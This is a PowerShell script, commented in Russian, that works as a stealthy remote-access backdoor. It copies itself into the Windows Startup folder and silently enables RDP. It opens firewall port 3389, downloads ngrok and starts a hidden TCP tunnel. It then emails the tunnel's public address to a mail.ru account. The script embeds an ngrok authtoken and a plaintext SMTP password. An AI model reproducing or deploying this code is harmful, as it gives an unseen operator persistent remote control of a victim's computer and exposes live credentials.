Start-Sleep -Seconds 10  # Пауза для появления интернета

# Логирование
$logFile = "$env:TEMP\ngrok_log.txt"
function Log($msg) {
    "[$(Get-Date)] $msg" | Out-File -FilePath $logFile -Append
}

Log "Скрипт запущен"

# Путь текущего скрипта
$thisScript = $MyInvocation.MyCommand.Path
Log "Текущий скрипт: $thisScript"

# Автозапуск
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ngrok.ps1"
if ($thisScript -ne $startupPath -and -not (Test-Path $startupPath)) {
    Copy-Item -Path $thisScript -Destination $startupPath -Force
    Log "Скрипт скопирован в автозагрузку"
    exit
}

# Включение RDP
try {
    Start-Process -FilePath reg.exe -ArgumentList 'add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f' -Verb RunAs -WindowStyle Hidden | Out-Null
    Log "RDP включён"
} catch {
    Log "Ошибка при включении RDP: $_"
}

# Открытие порта 3389
try {
    Start-Process -FilePath netsh -ArgumentList 'advfirewall firewall add rule name="ngrok RDP" dir=in action=allow protocol=TCP localport=3389' -WindowStyle Hidden | Out-Null
    Log "Firewall правило добавлено"
} catch {
    Log "Ошибка при добавлении firewall правила: $_"
}

# Установка ngrok
$ngrokDir = "$env:APPDATA\ngrok"
$ngrokExe = Join-Path $ngrokDir "ngrok.exe"
$tempZip  = "$env:TEMP\ngrok.zip"
if (-not (Test-Path $ngrokExe)) {
    try {
        Invoke-WebRequest -Uri "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-windows-amd64.zip" -OutFile $tempZip
        Expand-Archive -Path $tempZip -DestinationPath $ngrokDir -Force
        Log "Ngrok загружен и распакован"
    } catch {
        Log "Ошибка загрузки ngrok: $_"
    }
} else {
    Log "Ngrok уже установлен"
}

# Конфиг ngrok v2
$ngrokConfigDir = "$env:USERPROFILE\.ngrok2"
$ngrokConfig    = Join-Path $ngrokConfigDir "ngrok.yml"
if (-not (Test-Path $ngrokConfig)) {
    try {
        if (-not (Test-Path $ngrokConfigDir)) {
            New-Item -Path $ngrokConfigDir -ItemType Directory | Out-Null
        }
        @"
authtoken: 2xe3OPcwxui4icUAn8vBgxysHzH_6ceP3DS71bZm5mRxktwua
"@ | Out-File -Encoding ASCII $ngrokConfig
        Log "Конфиг ngrok создан"
    } catch {
        Log "Ошибка создания конфига: $_"
    }
}

# Запуск туннеля
try {
    Start-Process -FilePath $ngrokExe -ArgumentList "tcp 3389" -WindowStyle Hidden | Out-Null
    Log "Ngrok запущен"
} catch {
    Log "Ошибка при запуске ngrok: $_"
}

# Получение публичного адреса
$tunnelAddress = $null
for ($i = 0; $i -lt 30; $i++) {
    try {
        $resp = Invoke-RestMethod -Uri "http://127.0.0.1:4040/api/tunnels" -TimeoutSec 2
        $t = $resp.tunnels | Where-Object { $_.proto -eq "tcp" }
        if ($t -and $t.public_url) {
            $tunnelAddress = $t.public_url
            Log "Tunnel получен: $tunnelAddress"
            break
        }
    } catch {
        Start-Sleep -Seconds 1
    }
}
Log "TunnelAddress = $tunnelAddress"

# Настройки Mail.ru SMTP
$smtpServer = "smtp.mail.ru"
$smtpPort   = 587
$smtpUser   = "user.default00@mail.ru"
$smtpPass   = "DggLc7dSWENCbM56151O"

$from  = $smtpUser
$to    = $smtpUser
$subj  = "Ngrok RDP адрес"
$body  = if ($tunnelAddress) {
    "Ngrok публичный TCP адрес:`n`t$tunnelAddress"
} else {
    "Не удалось получить tunnel от ngrok."
}

# Отправка письма
try {
    Log "Попытка отправки email"
    $cred = New-Object System.Management.Automation.PSCredential(
        $smtpUser,
        ConvertTo-SecureString $smtpPass -AsPlainText -Force
    )
    Send-MailMessage `
        -From $from `
        -To $to `
        -Subject $subj `
        -Body $body `
        -SmtpServer $smtpServer `
        -Port $smtpPort `
        -UseSsl `
        -Credential $cred `
        -ErrorAction Stop
    Log "Письмо отправлено"
} catch {
    Log "Ошибка при отправке email: $_"
}

Log "Скрипт завершён"
